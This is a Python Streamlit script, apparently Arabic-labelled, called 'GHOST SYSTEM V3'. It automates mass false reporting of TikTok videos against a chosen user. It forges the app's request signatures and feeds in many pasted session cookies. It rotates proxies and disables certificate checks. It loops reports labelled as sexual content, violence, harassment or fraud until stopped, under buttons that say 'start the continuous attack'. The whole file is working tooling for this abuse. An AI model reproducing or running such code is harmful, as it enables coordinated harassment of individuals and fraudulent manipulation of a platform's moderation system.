import streamlit as st
import os  
try:  
    import requests  
    import binascii  
    import uuid  
    import time  
    import random  
    import secrets  
    import urllib3  
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)  
    from urllib.parse import urlencode
    import multiprocessing
    import re
    import datetime
    from MedoSigner import Argus, Gorgon, md5, Ladon  
except:  
    os.system("pip install requests uuid MedoSigner pycryptodome")  
      
import requests  
import binascii  
import uuid  
import time  
import random  
import os  
import secrets  
import urllib3  
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)  
from urllib.parse import urlencode
import multiprocessing
import re
import datetime
from MedoSigner import Argus, Gorgon, md5, Ladon  
import threading

# --- الواجهة المرعبة ---
st.markdown("""
    <style>
    .stApp { background-color: #000000; color: #ff0000; }
    .stTextInput>div>div>input, .stTextArea>div>div>textarea {
        background-color: #0a0a0a; color: #ff0000; border: 1px solid #ff0000;
    }
    .stButton>button {
        background-color: #ff0000; color: black; font-weight: bold; border-radius: 0; width: 100%;
    }
    h1 { text-shadow: 5px 5px 15px red; text-align: center; font-family: 'Courier New'; }
    </style>
    """, unsafe_allow_html=True)

st.write("<h1>GHOST SYSTEM V3 - NON STOP</h1>", unsafe_allow_html=True)

# --- الدوال الأصلية (نسخ لصق بدون تغيير حرف) ---

def sign(params, payload: str = None, sec_device_id: str = "", cookie: str or None = None, aid: int = 1233, license_id: int = 1611921764, sdk_version_str: str = "2.3.1.i18n", sdk_version: int =2, platform: int = 19, unix: int = None):  
    x_ss_stub = md5(payload.encode('utf-8')).hexdigest() if payload != None else None  
    if not unix: unix = int(time.time())  
    return Gorgon(params, unix, payload, cookie).get_value() | { "x-ladon"   : Ladon.encrypt(unix, license_id, aid),"x-argus"   : Argus.get_sign(params, x_ss_stub, unix,platform        = platform,aid             = aid,license_id      = license_id,sec_device_id   = sec_device_id,sdk_version     = sdk_version_str, sdk_version_int = sdk_version)}  

def get_video_info(link):
    try:
        response = requests.get(
            "https://api16-normal-c-alisg.ttapis.com/tiktok/linker/target/get/v1/",
            params={'url': link, 'iid': str(random.randint(1014, 1016)), 'device_id': str(random.randint(1014, 1016)), 'channel': 'googleplay', 'aid': '1233', 'app_name': 'musical_ly', 'version_code': '310503', 'version_name': '31.5.3', 'device_platform': 'android', 'device_type': 'SM-T505N', 'os_version': '12'},
            headers={'User-Agent': 'com.zhiliaoapp.musically/2023105030', 'x-argus': 'ahmed mahoz'}, timeout=5
        )
        Video = response.json()['landing_url']
        Username = Video.split("https://www.tiktok.com/@")[1].split("/video")[0]
        idVd = Video.split("/video/")[1].split("?")[0]
        tikinfo = requests.get(f'https://www.tiktok.com/@{Username}', timeout=5).text
        getting = tikinfo.split('webapp.user-detail"')[1].split('"RecommendUserList"')[0]
        UserId = getting.split('id":"')[1].split('",')[0]
        return idVd, UserId, Username
    except: return None, None, None

def report_video_fast(sessionid, idVd, UserId, report_type, proxy=None):
    try:
        secret = secrets.token_hex(16)
        cookies = {"sessionid": sessionid, "passport_csrf_token": secret, "passport_csrf_token_default": secret}
        params = {
            'report_type': "video", 'object_id': str(idVd), 'owner_id': str(UserId), 'reason': report_type['reason'], 'category': report_type['category'],
            'device_platform': "android", 'aid': "1233", 'app_name': "musical_ly", 'version_code': "370805", 'ts': str(int(time.time())),
            'iid': str(random.randint(1, 10**19)), 'device_id': str(random.randint(1, 10**19)), 'openudid': str(binascii.hexlify(os.urandom(8)).decode()),
        }
        m = sign(params=urlencode(params), payload="", cookie=urlencode(cookies))
        headers = {'User-Agent': "com.zhiliaoapp.musically/2023708050", 'x-argus': m["x-argus"], 'x-gorgon': m["x-gorgon"], 'x-khronos': m["x-khronos"], 'x-ladon': m["x-ladon"]}
        proxies = {"http": proxy, "https": proxy} if proxy else None
        response = requests.get(f"https://api16-normal-c-alisg.ttapis.com/aweme/v2/aweme/feedback/?{urlencode(params)}", headers=headers, cookies=cookies, proxies=proxies, verify=False, timeout=3)
        return '"status_code":0' in response.text
    except: return False

# --- إدارة الجلسة في Streamlit لمنع التوقف ---
if 'running' not in st.session_state: st.session_state.running = False
if 'ok' not in st.session_state: st.session_state.ok = 0
if 'bad' not in st.session_state: st.session_state.bad = 0

# --- المدخلات ---
col1, col2 = st.columns(2)
with col1:
    sessions_txt = st.text_area("🔑 لصق السيزنات")
    proxies_txt = st.text_area("🌐 لصق البروكسيات")
with col2:
    links_txt = st.text_area("🔗 لصق روابط الفيديوهات")
    user_target = st.text_input("👤 يوزر المستهدف")
    report_kind = st.selectbox("🚫 نوع البلاغ", ["90087 (جنسي)", "90044 (عنف)", "90045 (تحرش)", "90053 (احتيال)"])

# دالة التشغيل المستمر
def continuous_attack(sessions, links, report_data, proxies):
    while st.session_state.running:
        for link in links:
            if not st.session_state.running: break
            idVd, UserId, Username = get_video_info(link)
            if idVd:
                for session in sessions:
                    if not st.session_state.running: break
                    proxy = random.choice(proxies) if proxies else None
                    if report_video_fast(session, idVd, UserId, report_data, proxy):
                        st.session_state.ok += 1
                    else:
                        st.session_state.bad += 1
                    time.sleep(0.05)

# أزرار التحكم
c1, c2 = st.columns(2)
if c1.button("🔥 ابدأ الهجوم المستمر"):
    st.session_state.running = True
    # تحويل الاختيار لبيانات البلاغ
    r_map = {"90087 (جنسي)": {"reason": "90087", "category": "porn"}, "90044 (عنف)": {"reason": "90044", "category": "violence"}}
    rep_data = r_map.get(report_kind, {"reason": "90087", "category": "porn"})
    
    sess_list = [s.strip() for s in sessions_txt.split('\n') if s.strip()]
    link_list = [l.strip() for l in links_txt.split('\n') if l.strip()]
    prox_list = [p.strip() for p in proxies_txt.split('\n') if p.strip()]
    
    # تشغيل الهجوم في خيط منفصل (Thread) لضمان عدم توقف الواجهة
    t = threading.Thread(target=continuous_attack, args=(sess_list, link_list, rep_data, prox_list))
    t.start()

if c2.button("🛑 إيقاف الهجوم"):
    st.session_state.running = False

# عرض النتائج مباشرة
st.markdown(f"### ✅ ناجح: {st.session_state.ok} | ❌ فشل: {st.session_state.bad}")
if st.session_state.running:
    st.info("💀 النظام يرسل الآن بلاغات بدون توقف...")
    time.sleep(1)
    st.rerun() # تحديث الصفحة تلقائياً لرؤية العداد يزيد
